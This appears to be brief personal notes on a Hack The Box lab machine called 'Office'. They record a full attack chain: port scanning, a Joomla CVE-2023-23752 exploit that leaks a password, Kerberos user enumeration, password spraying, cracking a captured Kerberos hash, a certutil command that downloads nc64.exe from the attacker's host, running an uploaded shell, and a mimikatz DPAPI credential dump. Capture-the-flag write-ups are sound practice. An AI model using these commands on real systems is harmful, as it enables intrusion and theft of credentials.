![[Office image.png]]

Recon & Enumeration

rustscan -r 1-65535 -a 10.10.11.3 -- -sV -Pn -A

![[Office image 1.png]]

![[Office image 2.png]]

https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT

python3 CVE-2023-23752.py -u http://office.htb

![[Office image 3.png]]

\[+\] Password: H0lOgrams4reTakIng0Ver754!

./kerbrute_linux_amd64 --dc 10.10.11.3 -d office.htb userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

![[Office image 4.png]]

Create a users.txt that records the username found here.

crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares

![[Office image 5.png]]

smbclient \\\\10.10.11.3\\'SOC Analysis' -U dwolfe -L

![[Office image 6.png]]

cat hash.txt

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc

hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt

![[Office image 7.png]]

![[Office image 8.png]]

playboy69

cd C:\programdata

certutil.exe -urlcache -split -f http://10.10.14.120:8000/nc64.exe nc.exe

chisel.zipの解答

![[Office image 9.png]]

Privilege Escalation

shell.exeをupload

shell.exeをたたかせる

![[Office image 10.png]]

dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

![[Office image 11.png]]